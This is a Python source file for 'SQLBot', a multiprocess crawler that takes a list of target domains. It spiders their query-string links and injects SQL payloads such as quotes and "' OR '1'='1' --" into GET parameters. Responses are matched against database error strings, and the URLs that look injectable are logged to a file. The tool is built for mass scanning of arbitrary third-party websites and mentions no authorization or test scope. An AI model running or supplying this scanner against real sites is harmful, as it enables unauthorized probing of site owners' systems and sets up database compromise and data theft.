#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
import urllib.request,urllib,time,random,os,subprocess,requests
import sys,socket
from urllib.parse import urljoin
from urllib.parse import urlparse
from termcolor import colored
import colorama
colorama.init()
from bs4 import BeautifulSoup
from bs4 import XMLParsedAsHTMLWarning
import warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
import multiprocessing as mp
from colorama import init, Fore, Style
import urllib3
#############################################################################################
### GLOBAL VARIABLES
#############################################################################################
global logo
logo = '''
:'######::'#######:'##::::::'########::'#######:'########:
'##... ##'##.... ##:##:::::::##.... ##'##.... ##... ##..::
 ##:::..::##:::: ##:##:::::::##:::: ##:##:::: ##::: ##::::
. ######::##:::: ##:##:::::::########::##:::: ##::: ##::::
:..... ##:##:'## ##:##:::::::##.... ##:##:::: ##::: ##::::
'##::: ##:##:.. ##::##:::::::##:::: ##:##:::: ##::: ##::::
. ######:. ##### ##:########:########:. #######:::: ##::::
:......:::.....:..:........:........:::.......:::::..:::::
Coded By SourceCode347
'''
###########################################################################################
### Variables && Args
###########################################################################################
global sqlbotvulnerabilities
sqlbotvulnerabilities="sqlbotvulnerabilities.txt"
def filecreator(file_name):
    if not os.path.exists(file_name):
        with open(file_name, "w", encoding="utf-8") as f:
            f.write("")
filecreator(sqlbotvulnerabilities)
printChecking=True
processes=mp.cpu_count()
targets="targets.txt"
for arg in range(0,len(sys.argv)):
    if sys.argv[arg-1]=="-d" or sys.argv[arg-1]=="--disable":
        printChecking=False
    if sys.argv[arg-1]=="-p" or sys.argv[arg-1]=="--processes":
        processes=int(sys.argv[arg])
    if sys.argv[arg-1]=="-t" or sys.argv[arg-1]=="--targets":
        targets=str(sys.argv[arg])
    if sys.argv[arg-1]=="-o" or sys.argv[arg-1]=="--output":
        sqlbotvulnerabilities=str(sys.argv[arg])
    if sys.argv[arg-1]=="-h" or sys.argv[arg-1]=="--help":
        print(colored(logo, "green"))
        help = '''
        +------------------+------------------------------------------+---------------------------+
        | Argument         | Info                                     | Default                   |
        +------------------+------------------------------------------+---------------------------+
        | -h , --help      | Printing Help Of Arguments               | NULL                      |
        +------------------+------------------------------------------+---------------------------+
        | -d , --disable   | Disable Printing Of Crawling an URL      | True                      |
        +------------------+------------------------------------------+---------------------------+
        | -p , --processes | Integer Of Processes (eg. -p 64)         | CPU Threads               |
        +------------------+----------------------------------------------------------------------+
        | -t , --targets   | File list of website targets             | targets.txt               |
        +------------------+----------------------------------------------------------------------+
        | -o , --output    | Output File list Of SQLi Vulnerabilities | sqlbotvulnerabilities.txt |
        +------------------+----------------------------------------------------------------------+
        | Example Command  | python sqlbot.py -p 64 -t targets.txt                                |
        +-----------------------------------------------------------------------------------------+
        '''
        print(Fore.GREEN +f"{help}")
        sys.exit()
def processnamefix(pname):
    if len(pname)==9:
        return pname+" "
    elif len(pname)==8:
        return pname+"  "
    else:
        return pname
#############################################################################################
### ModernSQLiSpider
#############################################################################################
init(autoreset=True)

# Προχωρημένα payloads (error, time-based, blind)
PAYLOADS = [
    "'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
    "' OR '1'='1' --","1 AND 1=1", "1' AND 1=1 --"
]

ERROR_SIGNS = [
    "sql syntax", "mysql_fetch", "You have an error in your SQL syntax",
    "quoted string not properly terminated", "unclosed quotation mark",
    "ORA-", "PostgreSQL query failed"
]

class ModernSQLiSpider:
    def __init__(self, start_url, max_depth=3, delay=0.3):
        self.start_url = start_url
        self.max_depth = max_depth
        self.delay = delay
        self.visited = set()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; SQLBot/2.0;)"
        })

    def crawl(self, url, pname, depth=0):
        if depth > self.max_depth:
            return
        try:
            if printChecking==True:
                print(Fore.CYAN + f"[{pname}] [+] Crawling: {url}")
            self.visited.add(url)
            resp = self.session.get(url, timeout=10)
            if resp.status_code != 200:
                return
            if "?" in url:
                self.test_sql_injection(url, resp , pname)
            soup = BeautifulSoup(resp.text, 'html.parser')
            # find links
            links = soup.find_all("a", href=True)
            random.shuffle(links)
            for link in links:
                next_url = urljoin(url, link['href'].split('#')[0])
                if "?" in next_url and next_url not in self.visited and next_url.startswith(('http://', 'https://')):
                    time.sleep(self.delay + random.uniform(0, 1))
                    if next_url!=url:
                        depth+=1
                        if depth%3==0:
                            self.visited.clear()
                            return
                        self.crawl(next_url, pname, depth)
            else:
                return
        except Exception as e:
            #print(Fore.RED + f"[{pname}] [-] Error crawling {url}: {e}")
            pass
            return
    def saveurl(self , tl):
        domain = urlparse(tl).netloc
        with open(sqlbotvulnerabilities,"a") as f:
            if domain not in open(sqlbotvulnerabilities).read():   
                f.write(tl+"\n")
            f.close()
    def test_sql_injection(self, url, original_resp ,pname):
        """Test GET parameters"""
        parsed = urlparse(url)
        if not parsed.query:
            return       
        for payload in PAYLOADS:
            try:
                new_url = url.replace(parsed.query, f"{parsed.query}{payload}")
                resp = self.session.get(new_url, timeout=10)
                
                if any(err in resp.text.lower() for err in ERROR_SIGNS):
                    print(Fore.GREEN + f"[{pname}] [!] Possible SQLi (error-based) → {new_url}")
                    self.saveurl(url)
            except:
                pass
# ====================== WORKER ======================
def worker(worker_id, domain_chunk,pname):
    """Κάθε worker παίρνει το δικό του κομμάτι domains"""
    print(Fore.GREEN + f"[{pname}] Started with {len(domain_chunk)} domains")
    spider = ModernSQLiSpider(None, max_depth=3, delay=0.3)
    for i, domain in enumerate(domain_chunk, 1):
        try:
            print(Fore.CYAN + f"[{pname}] [{i}/{len(domain_chunk)}] Crawling → {domain}")
            spider.crawl(f"https://{domain}" if not domain.startswith("http") else domain , pname)
            time.sleep(0.3)
        except Exception as e:
            print(Fore.RED + f"[{pname}] Error on {domain}: {e}")
    print(Fore.GREEN + f"[{pname}] Finished all assigned domains!")
# ====================== HELPER FUNCTIONS ======================
def load_domains(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            domains = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        print(Fore.GREEN + f"[+] Loaded {len(domains):,} domains from {file_path}")
        return domains
    except FileNotFoundError:
        print(Fore.RED + f"[!] File not found: {file_path}")
        sys.exit(1)
    except Exception as e:
        print(Fore.RED + f"[!] Error reading file: {e}")
        sys.exit(1)
def split_domains(domains, num_processes):
    chunk_size = max(1, len(domains) // num_processes)
    chunks = [domains[i:i + chunk_size] for i in range(0, len(domains), chunk_size)]
    return chunks
# ====================== MAIN ======================
if __name__ == "__main__":
    print(colored(logo, "green"))
    domains_file = targets
    num_processes = processes
    all_domains = load_domains(domains_file)
    domain_chunks = split_domains(all_domains, num_processes)
    print(Fore.GREEN + f"🚀 Starting {num_processes} Processes")
    print(Fore.YELLOW + f"[+] Distributing {len(all_domains):,} domains (~{len(domain_chunks[0])} per process)")
    print(Fore.YELLOW + "[+] Press Ctrl+C to stop...\n")
    time.sleep(2)
    processes_list = []
    for i in range(num_processes):
        p = mp.Process(
            target=worker,
            args=(i+1, domain_chunks[i],processnamefix(f"SQLBot-{i+1}")),
            name=f"SQLBot-{i+1}",
            daemon=True
        )
        p.start()
        processes_list.append(p)
        time.sleep(0.2)
    print(Fore.GREEN + f"✅ All {num_processes} processes started successfully!")
    try:
        while True:
            time.sleep(60)
            pcount=0
            for p in processes_list:
                if p.is_alive():
                    pcount+=1
            if pcount==0:
                break
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n🛑 Stopping all processes...")
        for p in processes_list:
            if p.is_alive():
                p.terminate()
        print(Fore.GREEN + "All processes terminated.")